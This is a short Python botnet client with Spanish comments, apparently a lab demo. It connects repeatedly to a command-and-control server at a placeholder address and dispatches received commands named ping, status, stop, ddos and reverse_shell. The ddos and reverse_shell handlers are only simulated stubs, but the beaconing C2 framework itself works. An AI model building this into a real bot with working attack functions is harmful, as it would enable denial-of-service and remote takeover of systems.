import socket
import time

C2_HOST = '192.168.31.139'  # Cambia por la IP de tu servidor C&C
C2_PORT = 8080

def connect_to_c2():
    while True:
        try:
            conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            conn.connect((C2_HOST, C2_PORT))
            print("[*] Conectado al servidor C&C")
            while True:
                command = conn.recv(1024).decode()
                if command:
                    print(f"[+] Comando recibido: {command}")
                    execute_command(command, conn)
        except Exception as e:
            print(f"[!] Error de conexión: {e}")
            time.sleep(5)

def execute_command(command, conn):
    if command == "ping":
        conn.send("pong".encode())
    elif command == "status":
        conn.send("Estado del bot: Activo y escuchando comandos.".encode())
    elif command == "stop":
        print("[!] Bot detenido temporalmente.")
        conn.send("Bot detenido.".encode())
        time.sleep(10)  # Simula que el bot se detiene por 10 segundos
    elif command.startswith("ddos"):
        target = command.split(" ")[1]
        print(f"Simulando ataque DDoS contra {target}")
        conn.send(f"Iniciando ataque DDoS a {target}".encode())
    elif command == "reverse_shell":
        conn.send("Intentando establecer shell reversa...".encode())
        # Simulación, no implementa funcionalidad real
    else:
        conn.send("Comando no reconocido.".encode())

if __name__ == "__main__":
    connect_to_c2()



python3 c2_server.py
python3 bot.py
